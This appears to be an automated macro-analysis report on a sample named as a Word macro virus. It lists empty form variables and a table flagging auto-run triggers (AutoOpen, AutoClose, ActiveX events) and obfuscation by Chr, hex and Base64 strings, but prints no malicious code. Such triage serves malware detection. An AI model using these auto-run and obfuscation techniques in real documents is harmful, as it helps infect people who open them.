VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |ScrollBar1_Change   |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
